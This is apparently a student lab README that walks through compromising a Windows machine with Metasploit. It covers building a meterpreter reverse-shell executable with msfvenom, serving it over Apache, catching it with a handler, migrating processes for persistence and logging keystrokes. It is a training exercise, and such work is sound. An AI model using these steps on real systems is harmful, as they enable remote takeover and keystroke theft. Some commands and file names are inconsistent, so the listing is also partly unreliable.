# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/6b3f8eaf-7a0f-429b-b0de-58de105f3a13)

Create a malicious executable file fun.exe using msenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > malware.exe

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/53b6cb38-f126-4834-814b-8503cbec50db)


copy the malware.exe into the apache /var/www/html folder

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/80f20aec-7d05-452f-b3c6-0e57db10918f)


Start apache server

sudo systemctl apache2 start

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/1c4911cc-3478-4c68-81f6-4c056e535aa8)

Check the status of apache2

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/5195be21-f553-49d1-b582-cbab3210df94)

Invoke msfconsole:

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/0b89dd5e-f28d-4bc3-8b15-80df659785d0)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server

use multi/handler

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/7e0d0736-5601-4752-9eab-ca1ef83bfc2f)

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads.

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/23e0e6a4-04e0-4010-a788-0f19835f8ebe)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/eb1e5dc7-077f-40f9-8047-7ea53e2cc310)

To see a list of processes, at the meterpreter > prompt, execute this command:

ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/d7e90589-f988-4df2-869f-0904e518e713)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/2e221868-f9da-49ab-ad5e-036cd1a8107c)

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start Begins capturing keys typed in the target.

On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/67f347a0-6b6f-4621-8a80-f5350dded4c7)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Pranav-AJ/Compromising-windows-using-Metasploit/assets/118904526/ecbc2551-a10c-424a-a62f-e1395870814a)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
